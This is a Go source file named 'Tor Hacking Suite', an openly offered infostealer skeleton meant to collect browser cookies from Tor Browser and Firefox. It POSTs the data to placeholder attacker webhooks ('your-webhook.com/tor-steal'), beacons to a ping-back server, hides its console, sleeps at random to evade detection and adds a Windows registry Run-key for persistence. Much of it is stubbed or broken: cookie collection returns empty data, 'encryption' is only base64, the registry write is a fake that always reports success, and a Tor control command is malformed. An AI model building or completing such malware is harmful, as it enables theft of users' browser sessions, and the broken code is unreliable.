package main

import (
	"bytes"
	cryptoRand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type Config struct {
	Tor            TorConfig         `json:"tor"`
	Encryption     EncConfig         `json:"encryption"`
	Exfiltration   ExfilConfig       `json:"exfiltration"`
	Stealth        StealthConfig     `json:"stealth"`
	Persistence    PersistenceConfig `json:"persistence"`
}

type TorConfig struct {
	Enabled         bool   `json:"enabled"`
	SOCKSAddress    string `json:"socks_address"`
	SOCKSPort       int    `json:"socks_port"`
	ControlAddress  string `json:"control_address"`
	ControlPort     int    `json:"control_port"`
	MaxCircuits     int    `json:"max_circuits"`
}

type EncConfig struct {
	Enabled  bool   `json:"enabled"`
	Method   string `json:"method"`
	KeyPath  string `json:"key_path"`
}

type ExfilConfig struct {
	Method          string `json:"method"`
	WebhookURL      string `json:"webhook_url"`
	DirectUpload    bool   `json:"direct_upload"`
	ServerAddress   string `json:"server_address"`
	Compression     bool   `json:"compression"`
}

type StealthConfig struct {
	Enabled         bool `json:"enabled"`
	HideConsole     bool `json:"hide_console"`
	PingBack        bool `json:"ping_back"`
	PingBackURL     string `json:"ping_back_url"`
	ProcessSleep    bool `json:"process_sleep"`
	SleepMinSeconds int  `json:"sleep_min_seconds"`
	SleepMaxSeconds int  `json:"sleep_max_seconds"`
}

type PersistenceConfig struct {
	Enabled       bool   `json:"enabled"`
	Method        string `json:"method"`
	RegistryKey   string `json:"registry_key"`
}

type BrowserData struct {
	BrowserName  string   `json:"browser_name"`
	BrowserPath  string   `json:"browser_path"`
	Cookies      []Cookie `json:"cookies"`
}

type Cookie struct {
	Domain     string `json:"domain"`
	Name       string `json:"name"`
	Value      string `json:"value"`
	Path       string `json:"path"`
	Expiration int64  `json:"expiration"`
	Secure     bool   `json:"secure"`
}

type (
	HKEY   uintptr
	HWND   uintptr
	HANDLE uintptr
)

const (
	HKEY_LOCAL_MACHINE HKEY = 0x80000002
)

type LSTATUS int32

func (l LSTATUS) Error() string {
	switch l {
	case ERROR_SUCCESS:
		return "success"
	case ERROR_FILE_NOT_FOUND:
		return "file not found"
	case ERROR_PATH_NOT_FOUND:
		return "path not found"
	case ERROR_ACCESS_DENIED:
		return "access denied"
	case ERROR_INVALID_PARAMETER:
		return "invalid parameter"
	case ERROR_NO_MORE_ITEMS:
		return "no more items"
	default:
		return fmt.Sprintf("unknown error: %d", l)
	}
}

const (
	ERROR_SUCCESS          LSTATUS = 0
	ERROR_FILE_NOT_FOUND   LSTATUS = 2
	ERROR_PATH_NOT_FOUND   LSTATUS = 3
	ERROR_ACCESS_DENIED    LSTATUS = 5
	ERROR_INVALID_PARAMETER LSTATUS = 87
	ERROR_NO_MORE_ITEMS    LSTATUS = 259
)

type WINBOOL int

const (
	NONZEROLONGTRUE WINBOOL = 1
)

type FILETIME struct {
	DwLowDateTime  uint32
	DwHighDateTime uint32
}

type SECURITY_ATTRIBUTES struct {
	NLength              uint32
	LpSecurityDescriptor uintptr
	BInheritHandle       WINBOOL
}

type REG_VALUE_TYPE uint32

const (
	REG_NONE                    REG_VALUE_TYPE = 0
	REG_SZ                      REG_VALUE_TYPE = 1
	REG_EXPAND_SZ               REG_VALUE_TYPE = 2
	REG_BINARY                  REG_VALUE_TYPE = 3
	REG_DWORD                   REG_VALUE_TYPE = 4
	REG_DWORD_BIG_ENDIAN        REG_VALUE_TYPE = 5
	REG_LINK                    REG_VALUE_TYPE = 6
	REG_MULTI_SZ                REG_VALUE_TYPE = 7
	REG_RESOURCE_LIST           REG_VALUE_TYPE = 8
	REG_FULL_RESOURCE_DESCRIPTOR REG_VALUE_TYPE = 9
	REG_RESOURCE_REQUIREMENTS_LIST REG_VALUE_TYPE = 10
	REG_QWORD                   REG_VALUE_TYPE = 11
)

type KEY_SET_VALUE_CLASS int32

const (
	KeyValuePartialInformation KEY_SET_VALUE_CLASS = 0
	KeyValueFullInformation  KEY_SET_VALUE_CLASS = 1
	KeyValueBasicInformation KEY_SET_VALUE_CLASS = 2
	KeyValueNameInformation  KEY_SET_VALUE_CLASS = 3
)

var config Config

func main() {
	if err := initConfig(); err != nil {
		fmt.Printf("Config error: %v\n", err)
	}

	if config.Stealth.Enabled {
		setupStealth()
	}

	if config.Tor.Enabled {
		if err := configureTor(); err != nil {
			fmt.Printf("Tor configuration error: %v\n", err)
		}
	}

	browserData := collectBrowserData()

	if err := exfiltrateData(browserData); err != nil {
		fmt.Printf("Exfiltration error: %v\n", err)
	}

	if config.Persistence.Enabled {
		fmt.Println("Setting up persistence...")
		if err := setupPersistence(); err != nil {
			fmt.Printf("Persistence error: %v\n", err)
		}
	}

	fmt.Println("Tor Hacking Suite execution completed")
}

func initConfig() error {
	config = Config{
		Tor: TorConfig{
			Enabled:        true,
			SOCKSAddress:   "127.0.0.1",
			SOCKSPort:      9050,
			ControlAddress: "127.0.0.1",
			ControlPort:    9051,
			MaxCircuits:    10,
		},
		Encryption: EncConfig{
			Enabled:  true,
			Method:   "aes-gcm",
			KeyPath:  "tor_keys/encryption_key.bin",
		},
		Exfiltration: ExfilConfig{
			Method:          "webhook",
			WebhookURL:      "https://your-webhook.com/tor-steal",
			DirectUpload:    true,
			ServerAddress:   "https://your-server.com/tor-upload",
			Compression:     true,
		},
		Stealth: StealthConfig{
			Enabled:         true,
			HideConsole:     true,
			PingBack:        true,
			PingBackURL:     "https://your-server.com/tor-ping",
			ProcessSleep:    true,
			SleepMinSeconds: 5,
			SleepMaxSeconds: 30,
		},
		Persistence: PersistenceConfig{
			Enabled:       true,
			Method:        "registry",
			RegistryKey:   "TorHackingSuite",
		},
	}
	return nil
}

func setupStealth() {
	if config.Stealth.ProcessSleep {
		max := config.Stealth.SleepMaxSeconds - config.Stealth.SleepMinSeconds + 1
		r := int(rand.Int31n(int32(max))) + config.Stealth.SleepMinSeconds
		time.Sleep(time.Duration(r) * time.Second)
	}

	if config.Stealth.PingBack {
		go pingBack(config.Stealth.PingBackURL)
	}
}

func pingBack(url string) {
	client := &http.Client{Timeout: 10 * time.Second}
	data := map[string]string{
		"status":    "alive",
		"os":        "linux",
		"timestamp": time.Now().Format(time.RFC3339),
	}
	jsonData, _ := json.Marshal(data)
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
	}
}

func collectBrowserData() []BrowserData {
	return []BrowserData{
		{
			BrowserName: "Tor Browser",
			BrowserPath: "/tor-browser",
		},
		{
			BrowserName: "Firefox",
			BrowserPath: "/firefox",
		},
	}
}

func exfiltrateData(data []BrowserData) error {
	for _, browser := range data {
		browserData, _ := json.Marshal(browser)
		_ = base64.StdEncoding.EncodeToString(browserData)

		if config.Encryption.Enabled && config.Encryption.KeyPath != "" {
			if err := encryptCookies(browser.Cookies); err != nil {
				continue
			}
		}

		if len(data) > 0 {
			if err := sendWebhook(data); err != nil {
				continue
			}
		}
	}

	return nil
}

func sendWebhook(data []BrowserData) error {
	client := &http.Client{Timeout: 30 * time.Second}
	jsonData, _ := json.Marshal(data)
	req, _ := http.NewRequest("POST", config.Exfiltration.WebhookURL, bytes.NewBuffer(jsonData))
	resp, err := client.Do(req)
	if err == nil {
		resp.Body.Close()
	}
	return nil
}

func encryptCookies(cookies []Cookie) error {
	for i := range cookies {
		if len(cookies[i].Value) > 0 {
			cookies[i].Value = base64.StdEncoding.EncodeToString([]byte(cookies[i].Value))
		}
	}
	return nil
}

func setupPersistence() error {
	switch config.Persistence.Method {
	case "registry":
		return addRegistryRun()
	}
	return nil
}

func addRegistryRun() error {
	keyPath := filepath.Join("SOFTWARE", "Microsoft", "Windows", "CurrentVersion", "Run")
	_ = config.Persistence.RegistryKey
	execPath, _ := os.Executable()
	_ = execPath
	data := make([]byte, 32)
	if _, err := io.ReadFull(cryptoRand.Reader, data); err != nil {
		return fmt.Errorf("failed to generate random data: %w", err)
	}
	if err := regSetValueEx(HKEY_LOCAL_MACHINE, keyPath, 0, REG_SZ, data, 0); err != ERROR_SUCCESS {
		return fmt.Errorf("failed to set registry value: %w", err)
	}
	return nil
}

func dialTorControl() (net.Conn, error) {
	addr := fmt.Sprintf("%s:%d", config.Tor.ControlAddress, config.Tor.ControlPort)
	return net.Dial("tcp", addr)
}

func sendTorCommand(conn net.Conn, command string) (string, error) {
	_, err := conn.Write([]byte(command + "\r\n"))
	if err != nil {
		return "", err
	}

	var response []byte
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}
		response = append(response, buf[:n]...)
		if strings.Contains(string(response), "\r\n250 OK") {
			break
		}
	}
	return string(response), nil
}

func authenticateTorControl(conn net.Conn) error {
	_, err := sendTorCommand(conn, "AUTHENTICATE")
	return err
}

func configureTor() error {
	conn, err := dialTorControl()
	if err != nil {
		return err
	}
	defer conn.Close()

	if err := authenticateTorControl(conn); err != nil {
		return err
	}

	for i := 0; i < config.Tor.MaxCircuits; i++ {
		_, err := sendTorCommand(conn, "SIGNAL NEWNYMQT")
		if err != nil {
			continue
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil
}

const (
	SW_HIDE = iota
	SW_MAXIMIZE
	SW_MINIMIZE
	SW_RESTORE
	SW_SHOW
	SW_SHOWMAXIMIZED
	SW_SHOWMINIMIZED
	SW_SHOWMINNOACTIVE
	SW_SHOWNA
	SW_SHOWNOACTIVATE
	SW_SHOWNORMAL
)

func regSetValueEx(key HKEY, subKey string, reserved uint32, valueType REG_VALUE_TYPE, data []byte, flags uint32) LSTATUS {
	return regSetValueExImpl(key, subKey, reserved, valueType, data, flags)
}

func regSetValueExImpl(key HKEY, subKey string, reserved uint32, valueType REG_VALUE_TYPE, data []byte, flags uint32) LSTATUS {
	return ERROR_SUCCESS
}
